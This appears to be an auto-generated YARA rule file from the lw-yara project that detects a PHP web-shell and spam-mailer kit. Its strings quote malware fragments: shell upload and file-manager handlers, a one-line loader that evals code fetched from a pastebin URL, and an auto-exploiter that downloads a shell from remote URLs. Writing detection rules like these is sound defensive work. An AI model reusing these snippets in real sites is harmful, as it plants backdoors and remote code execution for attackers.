/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-14
   Identifier: Tryag-File-Manager-jpeg-master
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule Tryag_File_Manager_jpeg_master_0up {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file 0up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "083c429dc1ffeabbd474429b573c40d6f395b1765409fbb9e63c98f05c1fb80d"
   strings:
      $s1 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      //$s2 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }" fullword ascii
      //$s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      //$s4 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      //$s5 = "else { echo '<b>Not uploaded ! </b><br><br>'; }" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}


rule _media_brian_88D1_7DB91_infected_07_14_18_Tryag_File_Manager_jpeg_master_up {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "5bdaa9018e5892715d584d359f2d7eafd528137ec1ac403aafd56662e4bece05"
   strings:
      $s1 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }" fullword ascii
      $s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s4 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      $s5 = "else { echo '<b>Not uploaded ! </b><br><br>'; }" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule alexusMailer_v2_0 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file alexusMailer_v2.0.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "82572013074747e079cde069ab95af8b20b597aaf76eeb892dc383a58be24620"
   strings:
      $x1 = "</span><br>\"),$(\"#out_servers\").val($(\"#out_servers\").val()+b.server+\"\\n\")):$(\"#pingout_log\").html(c+\"<span style='co" ascii
      $x2 = "}b.merge(d,s.childNodes),s.textContent=\"\";while(s.firstChild)s.removeChild(s.firstChild);s=f.lastChild}else d.push(t.createTex" ascii
      $x3 = "*/(function(n){function vi(t){var i=this,e=t.target,y=n.data(e,a),p=s[y],w=p.popupName,k=f[w],v,b;if(!i.disabled&&n(e).attr(r)!=" ascii
      $x4 = "if(\"undefined\"==typeof jQuery)throw new Error(\"Bootstrap's JavaScript requires jQuery\");+function(a){\"use strict\";function" ascii
      $x5 = "return(!i||i!==r&&!b.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),b.support.submitBubble" ascii
      $x6 = "!function(a,b){\"use strict\";\"function\"==typeof define&&define.amd?define([\"jquery\"],b):\"object\"==typeof exports?module.e" ascii
      $x7 = "(function(e,t){var n,r,i=typeof t,o=e.document,a=e.location,s=e.jQuery,u=e.$,l={},c=[],p=\"1.9.1\",f=c.concat,d=c.push,h=c.slice" ascii
      $x8 = "body{background-color:#fff}.content{margin:0 auto;background-color:#fcf2d4;width:1000px;padding:5px;border:1px solid #000;border" ascii
      $x9 = ": http://serv4.ru/sw.php|c99|login:password<?php endif;?>\"  <?php if(SERVICEMODE):?>readonly<?php endif;?>></textarea><br>" fullword ascii
      $x10 = "\"error\"=>$translation->getWord(\"shell-sheck-test-command-execution-failed\")" fullword ascii
      $x11 = "'shell-sheck-test-command-execution-failed'=>'Test command execution failed'," fullword ascii
      $x12 = "On the Configuration tab of external servers is available quick check of shells, it checks that the addresses are correct, passw" ascii
      $x13 = "ach(function(){d.offsets.push(this[0]),d.targets.push(this[1])})},b.prototype.process=function(){var a,b=this.$scrollElement.scr" ascii
      $s14 = "\"echo file_get_contents(\\'http://google.com/humans.txt\\');\" " fullword ascii
      $s15 = "* Bootstrap v3.2.0 (http://getbootstrap.com)" fullword ascii
      $s16 = "'shell-sheck-test-command-execution-failed'=>'" fullword ascii
      $s17 = "* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)" fullword ascii
      $s18 = "return $shellManager->exec($type, $url, $code, $data, $pass, isset($login)?$login:null);" fullword ascii
      $s19 = "$answer=$shellManager->exec($type, $url, $testcode, $data, $pass, isset($login)?$login:null);" fullword ascii
      $s20 = "command. Try using the keyboard shortcut or context menu instead.\",f):ut(n,l?l:\"Error executing the \"+i+\" command.\",f))}ret" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2000KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}


rule TryagFileManager3 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file TryagFileManager3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');" fullword ascii
      $s3 = "echo '<br />Tryag File Manager Version <font color=\"red\">1.1</font>, Coded By <font color=\"red\">./ChmoD</font><br />Home: <f" ascii
      $s4 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s5 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s6 = "echo '<br />Tryag File Manager Version <font color=\"red\">1.1</font>, Coded By <font color=\"red\">./ChmoD</font><br />Home: <f" ascii
      $s7 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s8 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s9 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$pathen\\\">" fullword ascii
      $s10 = "$url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];" fullword ascii
      $s11 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s12 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s13 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s14 = "foreach($_POST as $key=>$value){" fullword ascii
      $s15 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s16 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s17 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s18 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s19 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s20 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule leafmailer {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file leafmailer.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "26b6e96b0103e547b08cabb2b0ef1f14acab5b154ffc69a1afc85c8dc47ae029"
   strings:
      $x1 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'>" fullword ascii
      $s2 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s3 = "<link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >" fullword ascii
      $s4 = "* Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5" fullword ascii
      $s5 = "$sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s6 = "$sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
      $s7 = "$privKeyStr = file_get_contents($this->DKIM_private);" fullword ascii
      $s8 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s9 = "<li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>" fullword ascii
      $s10 = "$sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));" fullword ascii
      $s11 = "Reciver Email = <b>user@domain.com</b><br>" fullword ascii
      $s12 = "$DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body" fullword ascii
      $s13 = "* and creates a plain-text version by converting the HTML." fullword ascii
      $s14 = "* Usually the email address used as the source of the email" fullword ascii
      $s15 = "<li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>" fullword ascii
      $s16 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form>" ascii
      $s17 = "* PHPMailer only supports some preset message types," fullword ascii
      $s18 = "* @param string $patternselect A selector for the validation pattern to use :" fullword ascii
      $s19 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>" fullword ascii
      $s20 = "if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _media_brian_88D1_7DB91_infected_07_14_18_Tryag_File_Manager_jpeg_master_x7 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file x7.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "6f6af1bc060e8030567dd30b1ec669872b0c4cb4bea3cd333949f6f4a2135acd"
   strings:
      $x1 = "<?php eval(\"?>\".file_get_contents(\"https://pastebin.com/raw/jAqZ3cxT\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) )
      ) or ( all of them )
}

rule OsComPayLoad {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file OsComPayLoad.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "0827d167971390bc8c718aed98308af04a8276e8ab7839fc51f2b4713a2ee001"
   strings:
      $x1 = "$text2 = http_get('https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/vuln.txt');" fullword ascii
      $x2 = "$text = http_get('https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php');" fullword ascii
      $s3 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/wp-content/vuln.php\" ;" fullword ascii
      $s4 = "$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;" fullword ascii
      $s5 = "function http_get($url){" fullword ascii
      $s6 = "return curl_exec($im);" fullword ascii
      $s7 = "curl_setopt($im, CURLOPT_HEADER, 0);" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 2KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule RUSSIAN_MAILER2018 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file RUSSIAN-MAILER2018.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "fc90f92c91ca7b149c9e268053e23e816e49e4613dcf9f09c318882cde8c5ecb"
   strings:
      $s1 = "$message = stripslashes($message);" fullword ascii
      $s2 = "$driv3r = $email[$i];" fullword ascii
      //$s3 = "$subject = $_POST['ssubject'];" fullword ascii
      //$s4 = "$testa = $_POST['veio'];" fullword ascii
      condition:
       all of them
}

rule mail_2018 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file mail-2018.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "35d176c910d8db75fb752620eec215aa618ba00a74b563d85db5bcd72fc0d710"
   strings:
      //$s1 = "$headers .= \"Content-Transfer-Encoding: \". encodeCTE($XXX['MessgaeEnc']).\"\\n\";" fullword ascii
      //$s2 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s3 = "//contact: https://www.facebook.com/achraf.orion.1//" fullword ascii
      //$s4 = "$headers .= \"Content-Type: text/html; charset=UTF-8\\n\";" fullword ascii
      //$s5 = "echo\"<br>*** (Sleep Mode <font color=green> On</font>) Sleeping <font color=red>$sleep seconds</font>... Done ***\";" fullword ascii
      //$s6 = "echo \"<br>$n - Sending... => $taz => <b> <font color=red> Error</font></b>\";" fullword ascii
      //$s7 = "var el = document.getElementById(\"hdlog\");" fullword ascii
      //$s8 = "<a class=\"navbar-brand\" href=\"http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']?>\">" fullword ascii
      //$s9 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">" fullword ascii
      //$s10 = "<input class=\"form-control input\" name=\"subject\"  placeholder=\"Subject\" required=\"\" type=\"text\" autocomplete=\"off\">" fullword ascii
      //$s11 = "<input class=\"form-control input\" name=\"subject\"  placeholder=\"Subject\" required=\"\" type=\"text\" autocomplete=\"" fullword ascii
      //$s12 = "str.length > 0 ? el.innerHTML += str.shift() : clearTimeout(running); " fullword ascii
      //$s13 = "<input class=\"form-control input\" name=\"email\" placeholder=\"Email\" required=\"\"\" type=\"text\" autocomplete=\"off\">" fullword ascii
      //$s14 = "<input class=\"form-control input\" name=\"email\" placeholder=\"Email\" required=\"\"\" type=\"text\" autocomplete=\"off\"" fullword ascii
      //$s15 = "<link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\" integrity=\"sha3" ascii
      //$s16 = "<input class=\"form-control input\" name=\"name\" placeholder=\"Name\" type=\"text\" autocomplete=\"off\">" fullword ascii
      $s17 = ".log{" fullword ascii
      //$s18 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      //$s19 = "$headers .= \"X-Priority: \".$XXX['Priority'].\"\\n\";" fullword ascii
      $s20 = "if (mail($taz, $subj, $mess, $headers)){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule shell_php {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      $s1 = "echo '<br />Coded by -_- janina</font>" fullword ascii
      $s2 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s4 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s5 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s6 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s7 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s8 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s9 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s10 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s11 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s12 = "foreach($_POST as $key=>$value){" fullword ascii
      $s13 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s14 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s15 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s16 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s17 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s18 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s19 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      $s20 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _TryagFileManager_TryagFileManager3_shell_php_0 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - from files TryagFileManager.php, TryagFileManager3.php, shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "e32a7a80127f4d5be15a811c9f52b0698f2b73e5d65d48808462b074b9131856"
      hash2 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
      hash3 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      $s1 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s2 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s3 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s4 = "foreach($_POST as $key=>$value){" fullword ascii
      $s5 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s6 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
      $s7 = "echo '<font color=\"red\">Delete File Error.</font><br />';" fullword ascii
      $s8 = "echo '<font color=\"red\">Edit File Error.</font><br />';" fullword ascii
      $s9 = "echo '<font color=\"red\">Change Name Error.</font><br />';" fullword ascii
      $s10 = "echo '<font color=\"red\">Delete Dir Error.</font><br />';" fullword ascii
      $s11 = "}elseif($_POST['opt'] == 'rename'){" fullword ascii
      $s12 = "$_POST['name'] = $_POST['newname'];" fullword ascii
      $s13 = "}elseif($_POST['type'] == 'file'){" fullword ascii
      $s14 = "$fp = fopen($_POST['path'],'w');" fullword ascii
      $s15 = "if($_POST['opt'] == 'chmod'){" fullword ascii
      $s16 = "echo '<form method=\"POST\">" fullword ascii
      $s17 = "if(rmdir($_POST['path'])){" fullword ascii
      $s18 = "if(unlink($_POST['path'])){" fullword ascii
      $s19 = "echo '<font color=\"green\">Change Permission Done.</font><br />';" fullword ascii
      $s20 = "Upload File : <input type=\"file\" name=\"file\" />" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 80KB and ( 8 of them )
      ) or ( all of them )
}

rule _TryagFileManager3_shell_php_1 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - from files TryagFileManager3.php, shell.php.pjpeg"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
      hash2 = "cb2241fd794aaff55b354114d1447e3e6411619ca257316807cb6d0d59651021"
   strings:
      //$s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s3 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      //$s4 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      //$s5 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      //$s6 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      //$s7 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      //$s8 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      //$s9 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      //$s10 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      //$s11 = "elseif(!is_readable(\"$path/$dir\")) echo '<font color=\"red\">';" fullword ascii
      //$s12 = "elseif(!is_readable(\"$path/$file\")) echo '<font color=\"red\">';" fullword ascii
      //$s13 = "if(rename($_POST['path'],$path.'/'.$_POST['newname'])){" fullword ascii
      //$s14 = "if(chmod($_POST['path'],$_POST['perm'])){" fullword ascii
      //$s15 = "<table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      //$s16 = "}elseif($_POST['opt'] == 'edit'){" fullword ascii
      //$s17 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" />" ascii
      //$s18 = "if(isset($_GET['path'])){" fullword ascii
      //$s19 = "if(fwrite($fp,$_POST['src'])){" fullword ascii
      //$s20 = "<input type=\\\"hidden\\\" name=\\\"type\\\" value=\\\"file\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

